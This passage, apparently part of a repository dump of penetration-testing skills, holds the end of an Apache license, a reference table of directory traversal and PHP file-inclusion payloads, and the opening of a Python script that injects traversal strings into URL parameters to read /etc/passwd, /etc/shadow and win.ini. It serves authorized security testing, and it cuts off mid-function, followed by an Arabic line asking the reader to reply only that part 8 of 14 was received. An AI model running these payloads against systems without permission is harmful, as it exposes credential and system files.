+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: performing-directory-traversal-testing/references/api-reference.md #####
+# API Reference: Performing Directory Traversal Testing
+
+## Traversal Payload Encodings
+
+| Encoding | Example | Description |
+|----------|---------|-------------|
+| Plain | `../../../etc/passwd` | Standard Unix traversal |
+| URL-encoded | `..%2f..%2f..%2fetc%2fpasswd` | Single URL encoding |
+| Double-encoded | `..%252f..%252f` | Bypass WAF single-decode |
+| UTF-8 overlong | `..%c0%af..%c0%af` | Bypass charset-based filters |
+| Backslash (Windows) | `..\\..\\..\\windows\\win.ini` | Windows path traversal |
+| Mixed separators | `..././..././` | Bypass recursive stripping |
+
+## PHP Wrapper Protocols (LFI)
+
+| Wrapper | Description |
+|---------|-------------|
+| `php://filter/convert.base64-encode/resource=` | Read file as base64 |
+| `php://input` | Read from POST body |
+| `expect://` | Execute system command |
+| `data://text/plain;base64,` | Inline data injection |
+| `file:///` | Direct file access |
+
+## Vulnerability Indicators
+
+| File | Content Indicator |
+|------|-------------------|
+| `/etc/passwd` | `root:x:0:0:` |
+| `win.ini` | `[fonts]`, `[extensions]` |
+| `/proc/self/environ` | Environment variables |
+| `/etc/shadow` | Hashed passwords (critical) |
+
+## requests Library
+
+| Method | Description |
+|--------|-------------|
+| `requests.get(url, allow_redirects=False)` | Send traversal payload |
+| `urllib.parse.urlencode(params)` | Encode parameters with payloads |
+| `urllib.parse.urlparse(url)` | Parse URL to extract parameters |
+
+## Key Libraries
+
+- **requests** (`pip install requests`): HTTP client for payload delivery
+- **urllib.parse** (stdlib): URL parsing and parameter manipulation
+
+## OWASP Testing Guide
+
+| Test ID | Description |
+|---------|-------------|
+| WSTG-ATHZ-01 | Testing for Directory Traversal / File Include |
+
+## References
+
+- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+- [PortSwigger Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
+- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
+
+##### END FILE #####
+
+##### FILE: performing-directory-traversal-testing/scripts/agent.py #####
+#!/usr/bin/env python3
+"""
+Directory Traversal Testing Agent — AUTHORIZED TESTING ONLY
+Tests web applications for path traversal (LFI) vulnerabilities by
+injecting traversal sequences into file path parameters.
+
+WARNING: Only use with explicit written authorization for the target application.
+"""
+
+import sys
+from datetime import datetime, timezone
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+import requests
+
+
+TRAVERSAL_PAYLOADS = [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "....//....//....//etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "/etc/passwd",
+    "\\..\\..\\..\\..\\windows\\win.ini",
+    "....\\....\\....\\etc\\passwd",
+    "..%5c..%5c..%5cwindows%5cwin.ini",
+    "/proc/self/environ",
+    "/etc/shadow",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "..././..././..././etc/passwd",
+    "..;/..;/..;/etc/passwd",
+]
+
+LINUX_INDICATORS = ["root:x:", "root:*:", "daemon:", "bin:x:", "nobody:"]
+WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit"]
+
+
+def identify_file_parameters(url: str) -> list[str]:
+    """Identify URL parameters that likely handle file paths."""
+    file_param_names = [
+        "file", "path", "page", "include", "template", "doc",
+        "document", "folder", "root", "dir", "filename",
+        "download", "read", "load", "view", "content",
+        "img", "image", "src", "resource", "cat",
+    ]
+
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    return [p for p in params if p.lower() in file_param_names]
+
+
+def test_traversal(url: str, param: str, session: requests.Session = None) -> list[dict]:
+    """Test a parameter for directory traversal vulnerability."""
+    if session is None:
+        session = requests.Session()
+
+    results = []
+    parsed = urlparse(url)
+    original_params = parse_qs(parsed.query)
+
+    for payload in TRAVERSAL_PAYLOADS:
+        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+        test_params[param] = payload
+
+        test_url = urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urlencode(test_params), parsed.fragment,
+        ))
+
+        try:
+            resp = session.get(test_url, timeout=10, allow_redirects=False)
+            body = resp.text
+
+            is_vulnerable = False
+            evidence = ""
+
+            for indicator in LINUX_INDICATORS:
+                if indicator in body:
+                    is_vulnerable = True
+                    evidence = f"Linux file content detected: '{indicator}'"
+                    break
+
+            if not is_vulnerable:
+                for indicator in WINDOWS_INDICATORS:
+                    if indicator.lower() in body.lower():
+                        is_vulnerable = True
+                        evidence = f"Windows file content detected: '{indicator}'"
+                        break
+
+            if is_vulnerable:
+                results.append({
+                    "url": test_url,
+                    "parameter": param,
+                    "payload": payload,
+                    "status_code": resp.status_code,
+                    "vulnerable": True,
+                    "evidence": evidence,
+                    "response_length": len(body),
+                    "severity": "HIGH",
+                })
+
+        except requests.RequestException:
+            continue
+
+    return results
+
+
+def test_null_byte_bypass(url: str, param: str, session: requests.Session = None) -> list[dict]:
+    """Test null byte injection to bypass file extension checks."""
+    if session is None:
+        session = requests.Session()
+
+    null_payloads = [
+        "../../../etc/passwd%00",
+
+-----
+[END PART 8/14] — رد غير "Received part 8/14"
